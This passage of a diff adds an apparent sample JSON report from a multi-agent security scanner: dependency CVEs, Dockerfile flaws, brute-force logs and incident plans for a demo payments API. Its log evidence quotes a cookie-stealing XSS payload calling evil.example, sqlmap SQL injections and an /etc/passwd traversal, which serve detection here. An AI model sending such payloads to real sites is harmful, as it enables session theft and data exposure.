@@ -1,0 +1,1868 @@
+{
+  "run_id": "sample-scan",
+  "started_at": "2026-09-05T16:02:59+00:00",
+  "finished_at": "2026-09-05T16:02:59+00:00",
+  "target_summary": {
+    "name": "acme-payments-api (demo)",
+    "log_sources": [
+      "demo/env/var/log/auth.log",
+      "demo/env/var/log/nginx/access.log"
+    ],
+    "repo_path": "demo/env/app",
+    "images": [],
+    "dockerfiles": [
+      "demo/env/app/Dockerfile"
+    ],
+    "api_endpoints": [
+      "https://api.acme.example/v1/pay"
+    ],
+    "framework": "NIST_CSF",
+    "asset_criticality": "high",
+    "exposure": "external",
+    "allow_active": false,
+    "agent_notes": {
+      "log_monitor": [
+        "read 12 events from demo/env/var/log/auth.log",
+        "read 7 events from demo/env/var/log/nginx/access.log"
+      ],
+      "vuln_scanner": [
+        "pip-audit not installed; used built-in advisory matcher for requirements",
+        "secret scan checked 4 text file(s)",
+        "semgrep not installed; skipped",
+        "bandit not installed; skipped",
+        "parsed Dockerfile Dockerfile (4 issue(s))"
+      ],
+      "threat_intel": [
+        "feed has no timestamp (offline sample) - staleness check N/A",
+        "enriched 14 findings; emitted 3 threat-intel findings"
+      ],
+      "incident_response": [
+        "11 plan(s) for 11 cluster(s)"
+      ],
+      "policy_checker": [
+        "assessed 12 controls of NIST Cybersecurity Framework 2.0; 8 failing/partial"
+      ]
+    },
+    "correlations": [
+      {
+        "type": "shared-ip",
+        "key": "203.0.113.66",
+        "finding_ids": [
+          "F-4dde57b4f8be",
+          "F-83069228f1b0",
+          "F-f3be33a4a8b1"
+        ],
+        "note": "3 findings involve 203.0.113.66"
+      },
+      {
+        "type": "shared-ip",
+        "key": "198.51.100.23",
+        "finding_ids": [
+          "F-3c0e8bd0a3a2",
+          "F-4c70da6fa645",
+          "F-8bd7e433f512",
+          "F-c87d3959274e"
+        ],
+        "note": "4 findings involve 198.51.100.23"
+      },
+      {
+        "type": "shared-cve",
+        "key": "CVE-2020-14343",
+        "finding_ids": [
+          "F-c3b8551319dc",
+          "F-ce3694347c63"
+        ],
+        "note": "2 findings concern CVE-2020-14343"
+      },
+      {
+        "type": "shared-cve",
+        "key": "CVE-2020-1747",
+        "finding_ids": [
+          "F-c3b8551319dc",
+          "F-ce3694347c63"
+        ],
+        "note": "2 findings concern CVE-2020-1747"
+      }
+    ]
+  },
+  "findings": [
+    {
+      "agent": "threat_intel",
+      "title": "CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)",
+      "description": "CVE-2020-14343 affects pyyaml <5.4. CVSS 9.8. Fixed in 5.4. A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.",
+      "severity": "critical",
+      "confidence": 0.95,
+      "category": "CVE-2020-14343",
+      "target": "pyyaml (all affected locations)",
+      "evidence": [
+        "Derived from finding F-c3b8551319dc (Vulnerable dependency: pyyaml==5.3.1 (CVE-2020-14343))"
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-14343",
+        "https://github.com/yaml/pyyaml/issues/420"
+      ],
+      "recommended_fix": "Upgrade pyyaml to >= 5.4 and redeploy.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-c3b8551319dc"
+      ],
+      "enrichment": {
+        "kev": false,
+        "exploited_in_wild": false,
+        "epss": 0.9,
+        "affected": "yes"
+      },
+      "id": "F-ce3694347c63"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "Vulnerable dependency: pyyaml==5.3.1 (CVE-2020-14343)",
+      "description": "A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "CVE-2020-14343",
+      "target": "requirements.txt:3",
+      "evidence": [
+        "requirements.txt:3: PyYAML==5.3.1"
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-14343",
+        "https://github.com/yaml/pyyaml/issues/420"
+      ],
+      "recommended_fix": "Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-ce3694347c63"
+      ],
+      "enrichment": {
+        "package": "pyyaml",
+        "installed_version": "5.3.1",
+        "fixed_version": "5.4",
+        "cvss": 9.8,
+        "cwe": "CWE-20",
+        "threat_intel": {
+          "CVE-2020-14343": {
+            "affected": "yes",
+            "reasoning": "matched advisory range for pyyaml",
+            "cvss": 9.8,
+            "epss": 0.9,
+            "kev": false,
+            "exploited_in_wild": false,
+            "fixed_version": "5.4",
+            "cwe": "CWE-20",
+            "summary": "A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.",
+            "sources": [
+              "https://nvd.nist.gov/vuln/detail/CVE-2020-14343",
+              "https://github.com/yaml/pyyaml/issues/420"
+            ],
+            "stale": false
+          },
+          "CVE-2020-1747": {
+            "affected": "uncertain",
+            "reasoning": "CVE not present in the configured feed"
+          }
+        },
+        "epss": 0.9,
+        "correlations": [
+          {
+            "with": "F-ce3694347c63",
+            "reason": "same vulnerability CVE-2020-14343"
+          }
+        ]
+      },
+      "id": "F-c3b8551319dc"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)",
+      "description": "Jinja2 sandbox escape via str.format_map, allowing an attacker who controls a template to break out of the sandbox.",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "CVE-2019-10906",
+      "target": "requirements.txt:4",
+      "evidence": [
+        "requirements.txt:4: Jinja2==2.10"
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2019-10906"
+      ],
+      "recommended_fix": "Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "package": "jinja2",
+        "installed_version": "2.10",
+        "fixed_version": "2.10.1",
+        "cvss": 9.8,
+        "cwe": "CWE-20",
+        "threat_intel": {
+          "CVE-2019-10906": {
+            "affected": "yes",
+            "reasoning": "matched advisory range for jinja2",
+            "cvss": 9.8,
+            "epss": 0.12,
+            "kev": false,
+            "exploited_in_wild": false,
+            "fixed_version": "2.10.1",
+            "cwe": "CWE-20",
+            "summary": "Jinja2 sandbox escape via str.format_map, allowing an attacker who controls a template to break out of the sandbox.",
+            "sources": [
+              "https://nvd.nist.gov/vuln/detail/CVE-2019-10906"
+            ],
+            "stale": false
+          }
+        },
+        "epss": 0.12
+      },
+      "id": "F-4d73c8cbff46"
+    },
+    {
+      "agent": "log_monitor",
+      "title": "Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)",
+      "description": "8 failed authentication events from 203.0.113.66 between Sep  6 01:12:03 .. Sep  6 01:12:21. No successful login from this IP was observed.",
+      "severity": "high",
+      "confidence": 1.0,
+      "category": "ATT&CK T1110.001",
+      "target": "demo/env/var/log/auth.log",
+      "evidence": [
+        "Sep  6 01:12:03 pay-api-1 sshd[20441]: Failed password for invalid user admin from 203.0.113.66 port 51422 ssh2",
+        "Sep  6 01:12:05 pay-api-1 sshd[20443]: Failed password for invalid user admin from 203.0.113.66 port 51488 ssh2",
+        "Sep  6 01:12:07 pay-api-1 sshd[20445]: Failed password for root from 203.0.113.66 port 51590 ssh2",
+        "Sep  6 01:12:09 pay-api-1 sshd[20447]: Failed password for root from 203.0.113.66 port 51640 ssh2",
+        "Sep  6 01:12:12 pay-api-1 sshd[20449]: Failed password for invalid user deploy from 203.0.113.66 port 51701 ssh2",
+        "Sep  6 01:12:15 pay-api-1 sshd[20451]: Failed password for invalid user deploy from 203.0.113.66 port 51777 ssh2"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1110/"
+      ],
+      "recommended_fix": "Block the source IP at the edge, lock/reset the targeted account(s), enforce MFA, and deploy rate-limiting / fail2ban on the auth service.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-f3be33a4a8b1",
+        "F-83069228f1b0"
+      ],
+      "enrichment": {
+        "source_ip": "203.0.113.66",
+        "failure_count": 8,
+        "breached": false,
+        "ioc": {
+          "203.0.113.66": {
+            "category": "brute-force / credential-stuffing source",
+            "campaign": "sample-cred-stuffing-2026",
+            "first_seen": "2026-08-20",
+            "confidence": 0.8,
+            "sources": [
+              "sample-data"
+            ]
+          }
+        },
+        "correlations": [
+          {
+            "with": "F-f3be33a4a8b1",
+            "reason": "shared source IP 203.0.113.66"
+          },
+          {
+            "with": "F-83069228f1b0",
+            "reason": "shared source IP 203.0.113.66"
+          }
+        ]
+      },
+      "id": "F-4dde57b4f8be"
+    },
+    {
+      "agent": "log_monitor",
+      "title": "XSS probe: 1 request(s) from 198.51.100.23",
+      "description": "1 HTTP request(s) matched the 'XSS probe' signature. At least one received a non-error (<400) response - possible successful exploitation, investigate.",
+      "severity": "high",
+      "confidence": 0.95,
+      "category": "OWASP-A03 / ATT&CK T1190",
+      "target": "demo/env/var/log/nginx/access.log",
+      "evidence": [
+        "198.51.100.23 - - [06/Sep/2026:01:31:02 +0000] \"GET /search?q=<script>document.location='http://evil.example/c?'+document.cookie</script> HTTP/1.1\" 200 1990 \"-\" \"Mozilla/5.0\""
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1190/"
+      ],
+      "recommended_fix": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-4c70da6fa645",
+        "F-3c0e8bd0a3a2",
+        "F-c87d3959274e"
+      ],
+      "enrichment": {
+        "source_ips": [
+          "198.51.100.23"
+        ],
+        "possible_success": true,
+        "ioc": {
+          "198.51.100.23": {
+            "category": "web application scanning (sqlmap-style probes)",
+            "campaign": "sample-web-scan-2026",
+            "first_seen": "2026-08-28",
+            "confidence": 0.7,
+            "sources": [
+              "sample-data"
+            ]
+          }
+        },
+        "correlations": [
+          {
+            "with": "F-4c70da6fa645",
+            "reason": "shared source IP 198.51.100.23"
+          },
+          {
+            "with": "F-3c0e8bd0a3a2",
+            "reason": "shared source IP 198.51.100.23"
+          },
+          {
+            "with": "F-c87d3959274e",
+            "reason": "shared source IP 198.51.100.23"
+          }
+        ]
+      },
+      "id": "F-8bd7e433f512"
+    },
+    {
+      "agent": "threat_intel",
+      "title": "Traffic involves known-malicious IP 203.0.113.66 (brute-force / credential-stuffing source)",
+      "description": "203.0.113.66 appears in threat intelligence as brute-force / credential-stuffing source (campaign sample-cred-stuffing-2026, first seen 2026-08-20). It is referenced by finding F-4dde57b4f8be.",
+      "severity": "high",
+      "confidence": 0.9,
+      "category": "ATT&CK T1595 / IOC",
+      "target": "203.0.113.66",
+      "evidence": [
+        "Derived from finding F-4dde57b4f8be (Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts))",
+        "Derived from finding F-f3be33a4a8b1 (Path traversal / LFI probe: 1 request(s) from 203.0.113.66)"
+      ],
+      "references": [
+        "sample-data"
+      ],
+      "recommended_fix": "Block 203.0.113.66 at the perimeter and hunt for other activity from it.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-4dde57b4f8be",
+        "F-f3be33a4a8b1"
+      ],
+      "enrichment": {
+        "ioc_ip": "203.0.113.66",
+        "campaign": "sample-cred-stuffing-2026"
+      },
+      "id": "F-83069228f1b0"
+    },
+    {
+      "agent": "log_monitor",
+      "title": "SQL injection probe: 2 request(s) from 198.51.100.23",
+      "description": "2 HTTP request(s) matched the 'SQL injection probe' signature. All matched requests received error responses.",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "OWASP-A03 / ATT&CK T1190",
+      "target": "demo/env/var/log/nginx/access.log",
+      "evidence": [
+        "198.51.100.23 - - [06/Sep/2026:01:30:11 +0000] \"GET /api/v1/items?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 500 812 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "198.51.100.23 - - [06/Sep/2026:01:30:15 +0000] \"GET /api/v1/items?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1\" 500 812 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\""
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1190/"
+      ],
+      "recommended_fix": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-3c0e8bd0a3a2",
+        "F-8bd7e433f512",
+        "F-c87d3959274e"
+      ],
+      "enrichment": {
+        "source_ips": [
+          "198.51.100.23"
+        ],
+        "possible_success": false,
+        "ioc": {
+          "198.51.100.23": {
+            "category": "web application scanning (sqlmap-style probes)",
+            "campaign": "sample-web-scan-2026",
+            "first_seen": "2026-08-28",
+            "confidence": 0.7,
+            "sources": [
+              "sample-data"
+            ]
+          }
+        },
+        "severity_adjustment": {
+          "from": "medium",
+          "to": "high",
+          "reason": "source/destination IP 198.51.100.23 matches threat intelligence"
+        },
+        "correlations": [
+          {
+            "with": "F-3c0e8bd0a3a2",
+            "reason": "shared source IP 198.51.100.23"
+          },
+          {
+            "with": "F-8bd7e433f512",
+            "reason": "shared source IP 198.51.100.23"
+          },
+          {
+            "with": "F-c87d3959274e",
+            "reason": "shared source IP 198.51.100.23"
+          }
+        ]
+      },
+      "id": "F-4c70da6fa645"
+    },
+    {
+      "agent": "log_monitor",
+      "title": "Known scanner user-agent: 3 request(s) from 198.51.100.23",
+      "description": "3 HTTP request(s) matched the 'Known scanner user-agent' signature. Reconnaissance tooling - not an exploit attempt on its own, but expect follow-up.",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "ATT&CK T1595",
+      "target": "demo/env/var/log/nginx/access.log",
+      "evidence": [
+        "198.51.100.23 - - [06/Sep/2026:01:30:11 +0000] \"GET /api/v1/items?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 500 812 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "198.51.100.23 - - [06/Sep/2026:01:30:13 +0000] \"GET /api/v1/items?id=1%20OR%201=1 HTTP/1.1\" 200 4021 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "198.51.100.23 - - [06/Sep/2026:01:30:15 +0000] \"GET /api/v1/items?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1\" 500 812 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\""
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1190/"
+      ],
+      "recommended_fix": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-4c70da6fa645",
+        "F-8bd7e433f512",
+        "F-c87d3959274e"
+      ],
+      "enrichment": {
+        "source_ips": [
+          "198.51.100.23"
+        ],
+        "possible_success": true,
+        "ioc": {
+          "198.51.100.23": {
+            "category": "web application scanning (sqlmap-style probes)",
+            "campaign": "sample-web-scan-2026",
+            "first_seen": "2026-08-28",
+            "confidence": 0.7,
+            "sources": [
+              "sample-data"
+            ]
+          }
+        },
+        "severity_adjustment": {
+          "from": "medium",
+          "to": "high",
+          "reason": "source/destination IP 198.51.100.23 matches threat intelligence"
+        },
+        "correlations": [
+          {
+            "with": "F-4c70da6fa645",
+            "reason": "shared source IP 198.51.100.23"
+          },
+          {
+            "with": "F-8bd7e433f512",
+            "reason": "shared source IP 198.51.100.23"
+          },
+          {
+            "with": "F-c87d3959274e",
+            "reason": "shared source IP 198.51.100.23"
+          }
+        ]
+      },
+      "id": "F-3c0e8bd0a3a2"
+    },
+    {
+      "agent": "log_monitor",
+      "title": "Path traversal / LFI probe: 1 request(s) from 203.0.113.66",
+      "description": "1 HTTP request(s) matched the 'Path traversal / LFI probe' signature. All matched requests received error responses.",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "OWASP-A01 / ATT&CK T1190",
+      "target": "demo/env/var/log/nginx/access.log",
+      "evidence": [
+        "203.0.113.66 - - [06/Sep/2026:01:33:41 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 404 179 \"-\" \"curl/8.2.1\""
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1190/"
+      ],
+      "recommended_fix": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-4dde57b4f8be",
+        "F-83069228f1b0"
+      ],
+      "enrichment": {
+        "source_ips": [
+          "203.0.113.66"
+        ],
+        "possible_success": false,
+        "ioc": {
+          "203.0.113.66": {
+            "category": "brute-force / credential-stuffing source",
+            "campaign": "sample-cred-stuffing-2026",
+            "first_seen": "2026-08-20",
+            "confidence": 0.8,
+            "sources": [
+              "sample-data"
+            ]
+          }
+        },
+        "severity_adjustment": {
+          "from": "medium",
+          "to": "high",
+          "reason": "source/destination IP 203.0.113.66 matches threat intelligence"
+        },
+        "correlations": [
+          {
+            "with": "F-4dde57b4f8be",
+            "reason": "shared source IP 203.0.113.66"
+          },
+          {
+            "with": "F-83069228f1b0",
+            "reason": "shared source IP 203.0.113.66"
+          }
+        ]
+      },
+      "id": "F-f3be33a4a8b1"
+    },
+    {
+      "agent": "threat_intel",
+      "title": "Traffic involves known-malicious IP 198.51.100.23 (web application scanning (sqlmap-style probes))",
+      "description": "198.51.100.23 appears in threat intelligence as web application scanning (sqlmap-style probes) (campaign sample-web-scan-2026, first seen 2026-08-28). It is referenced by finding F-4c70da6fa645.",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "ATT&CK T1595 / IOC",
+      "target": "198.51.100.23",
+      "evidence": [
+        "Derived from finding F-4c70da6fa645 (SQL injection probe: 2 request(s) from 198.51.100.23)",
+        "Derived from finding F-3c0e8bd0a3a2 (Known scanner user-agent: 3 request(s) from 198.51.100.23)",
+        "Derived from finding F-8bd7e433f512 (XSS probe: 1 request(s) from 198.51.100.23)"
+      ],
+      "references": [
+        "sample-data"
+      ],
+      "recommended_fix": "Block 198.51.100.23 at the perimeter and hunt for other activity from it.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [
+        "F-4c70da6fa645",
+        "F-3c0e8bd0a3a2",
+        "F-8bd7e433f512"
+      ],
+      "enrichment": {
+        "ioc_ip": "198.51.100.23",
+        "campaign": "sample-web-scan-2026"
+      },
+      "id": "F-c87d3959274e"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "Unpinned base image (`:latest` or no tag) in Dockerfile:2",
+      "description": "Unpinned base image (`:latest` or no tag)",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "CWE-1188",
+      "target": "demo/env/app/Dockerfile:2",
+      "evidence": [
+        "Dockerfile:2: FROM python:latest"
+      ],
+      "references": [
+        "https://cwe.mitre.org/data/definitions/1188.html"
+      ],
+      "recommended_fix": "Pin the base image to an immutable digest (FROM image@sha256:...).",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "artifact": "dockerfile",
+        "severity_adjustment": {
+          "from": "medium",
+          "to": "high",
+          "reason": "context: exploit maturity / external exposure / asset criticality / confidence"
+        }
+      },
+      "id": "F-baff40d64173"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "ADD used to fetch a remote URL in Dockerfile:8",
+      "description": "ADD used to fetch a remote URL",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "CWE-494",
+      "target": "demo/env/app/Dockerfile:8",
+      "evidence": [
+        "Dockerfile:8: ADD https://example.com/bootstrap/install.sh /tmp/install.sh"
+      ],
+      "references": [
+        "https://cwe.mitre.org/data/definitions/494.html"
+      ],
+      "recommended_fix": "Use COPY for local files; download with verified checksums in a RUN step.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "artifact": "dockerfile",
+        "severity_adjustment": {
+          "from": "medium",
+          "to": "high",
+          "reason": "context: exploit maturity / external exposure / asset criticality / confidence"
+        }
+      },
+      "id": "F-7fc2198b44a0"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "Container runs as root (no non-root USER instruction) in Dockerfile:17",
+      "description": "Container runs as root (no non-root USER instruction)",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "CWE-250",
+      "target": "demo/env/app/Dockerfile:17",
+      "evidence": [
+        "Dockerfile:17: (no USER instruction)"
+      ],
+      "references": [
+        "https://cwe.mitre.org/data/definitions/250.html"
+      ],
+      "recommended_fix": "Add a non-root `USER` instruction and make required paths writable by that UID.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "artifact": "dockerfile"
+      },
+      "id": "F-976af72625aa"
+    },
+    {
+      "agent": "log_monitor",
+      "title": "Privilege-escalation attempts via sudo (2 event(s))",
+      "description": "Repeated sudo authentication failures or use by a user not in sudoers.",
+      "severity": "high",
+      "confidence": 0.6,
+      "category": "ATT&CK T1548.003",
+      "target": "demo/env/var/log/auth.log",
+      "evidence": [
+        "Sep  6 01:14:44 pay-api-1 sudo[20512]: alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
+        "Sep  6 01:15:01 pay-api-1 sudo[20520]: bob : user NOT in the sudoers file ; TTY=pts/1 ; PWD=/srv ; USER=root ; COMMAND=/usr/bin/id"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1548/003/"
+      ],
+      "recommended_fix": "Review sudoers, alert on repeated failures, and confirm the account owner.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "source_ips": [],
+        "severity_adjustment": {
+          "from": "medium",
+          "to": "high",
+          "reason": "context: exploit maturity / external exposure / asset criticality / confidence"
+        }
+      },
+      "id": "F-f1c73039b1c6"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "Hardcoded secret (aws_access_key_id) in settings.py:4",
+      "description": "A credential-like string is committed to the repository.",
+      "severity": "high",
+      "confidence": 0.6,
+      "category": "CWE-798",
+      "target": "settings.py:4",
+      "evidence": [
+        "settings.py:4: AWS_ACCESS_KEY_ID = \"[REDACTED:aws-akid]\""
+      ],
+      "references": [
+        "https://cwe.mitre.org/data/definitions/798.html"
+      ],
+      "recommended_fix": "Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "rule": "aws_access_key_id",
+        "false_positive_likelihood": "medium"
+      },
+      "id": "F-014c834cd5cd"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "apt-get install without cleaning apt lists in Dockerfile:9",
+      "description": "apt-get install without cleaning apt lists",
+      "severity": "medium",
+      "confidence": 0.75,
+      "category": "CWE-1188",
+      "target": "demo/env/app/Dockerfile:9",
+      "evidence": [
+        "Dockerfile:9: RUN apt-get update && apt-get install -y curl build-essential"
+      ],
+      "references": [
+        "https://cwe.mitre.org/data/definitions/1188.html"
+      ],
+      "recommended_fix": "Append `&& rm -rf /var/lib/apt/lists/*` to shrink layers and attack surface.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "artifact": "dockerfile",
+        "severity_adjustment": {
+          "from": "low",
+          "to": "medium",
+          "reason": "context: exploit maturity / external exposure / asset criticality / confidence"
+        }
+      },
+      "id": "F-e43293fc771f"
+    },
+    {
+      "agent": "vuln_scanner",
+      "title": "API active testing skipped (no --allow-active / not on allowlist)",
+      "description": "1 endpoint(s) provided. Active testing requires target.allow_active=true and each host present in target.allowlist.",
+      "severity": "low",
+      "confidence": 0.95,
+      "category": "coverage-gap",
+      "target": "https://api.acme.example/v1/pay",
+      "evidence": [],
+      "references": [],
+      "recommended_fix": "Re-run with allow_active and an explicit allowlist to enable API checks.",
+      "requires_human_approval": false,
+      "discovered_at": "2026-09-05T16:02:59+00:00",
+      "correlated_ids": [],
+      "enrichment": {
+        "severity_adjustment": {
+          "from": "info",
+          "to": "low",
+          "reason": "context: exploit maturity / external exposure / asset criticality / confidence"
+        }
+      },
+      "id": "F-817e9ba6560b"
+    }
+  ],
+  "incident_plans": [
+    {
+      "finding_ids": [
+        "F-c3b8551319dc",
+        "F-ce3694347c63"
+      ],
+      "title": "IR plan: CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)",
+      "priority": "P1",
+      "sla": "Begin containment within 1 hour",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation",
+          "owner_role": "AppSec",
+          "command_or_change": "Add mitigating WAF rule or disable the vulnerable feature/route",
+          "rollback": "Remove mitigation after upgrade",
+          "verification": "Exploit path blocked or unreachable",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Upgrade the affected package to the fixed version and rebuild artifacts/images",
+          "owner_role": "App team",
+          "command_or_change": "Bump the pinned version to >= fixed release; rebuild and re-scan",
+          "rollback": "Pin back to previous version",
+          "verification": "Scanner reports the CVE resolved",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Deploy the rebuilt service and run regression + smoke tests",
+          "owner_role": "App team",
+          "command_or_change": "",
+          "rollback": "Roll back to previous build",
+          "verification": "Service healthy; version confirmed in runtime",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Enable automated dependency updates (Dependabot/Renovate) and SCA in CI",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "New advisories open PRs automatically; CI fails on known-vuln deps",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: pyyaml (all affected locations), requirements.txt:3",
+        "data_at_risk": "Depends on the vulnerable component's role; assume code/data on the host",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "App team",
+        "AppSec",
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)\nPriority: P1   SLA: Begin containment within 1 hour\nAffected: pyyaml (all affected locations)\nDetected by: threat_intel at 2026-09-05T16:02:59+00:00\n\nWhat we know: CVE-2020-14343 affects pyyaml <5.4. CVSS 9.8. Fixed in 5.4. A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.\nImmediate actions proposed: Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-4d73c8cbff46"
+      ],
+      "title": "IR plan: Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)",
+      "priority": "P1",
+      "sla": "Begin containment within 1 hour",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation",
+          "owner_role": "AppSec",
+          "command_or_change": "Add mitigating WAF rule or disable the vulnerable feature/route",
+          "rollback": "Remove mitigation after upgrade",
+          "verification": "Exploit path blocked or unreachable",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Upgrade the affected package to the fixed version and rebuild artifacts/images",
+          "owner_role": "App team",
+          "command_or_change": "Bump the pinned version to >= fixed release; rebuild and re-scan",
+          "rollback": "Pin back to previous version",
+          "verification": "Scanner reports the CVE resolved",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Deploy the rebuilt service and run regression + smoke tests",
+          "owner_role": "App team",
+          "command_or_change": "",
+          "rollback": "Roll back to previous build",
+          "verification": "Service healthy; version confirmed in runtime",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Enable automated dependency updates (Dependabot/Renovate) and SCA in CI",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "New advisories open PRs automatically; CI fails on known-vuln deps",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: requirements.txt:4",
